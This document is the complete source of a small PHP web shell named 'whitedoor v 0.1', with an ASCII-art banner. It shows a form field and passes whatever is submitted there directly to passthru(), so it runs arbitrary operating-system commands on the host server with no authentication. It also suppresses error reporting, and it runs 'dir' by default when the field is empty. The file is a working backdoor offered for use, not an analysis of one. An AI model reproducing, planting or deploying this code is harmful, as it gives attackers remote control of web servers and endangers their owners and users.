
<center>
<font color="green">
<pre><b>
        .__    .__  __             .___                   
__  _  _|  |__ |__|/  |_  ____   __| _/____   ___________ 
\ \/ \/ /  |  \|  \   __\/ __ \ / __ |/  _ \ /  _ \_  __ \
 \     /|   Y  \  ||  | \  ___// /_/ (  <_> |  <_> )  | \/
  \/\_/ |___|  /__||__|  \___  >____ |\____/ \____/|__|   
             \/              \/     \/                  
                                                                                                                                            
</pre></b>
</font>
</center>
<?php
error_reporting(0);
$function=passthru; 
echo "<html>
<head>
<title>whitedoor v 0.1 - ".$_SERVER['SERVER_NAME']."</title>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";


echo '<b><SPAN style="BACKGROUND-COLOR: #ffff00"><font color = "red" >[~] Enter Command [~]</font></SPAN></b>';
echo "<form method=post>";

echo "<input type=text name=cmd size=85>";
echo "</form>";
echo "<pre>";
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="dir"; }
echo "".$function($_POST['cmd'])."</pre></body></html>";



?>

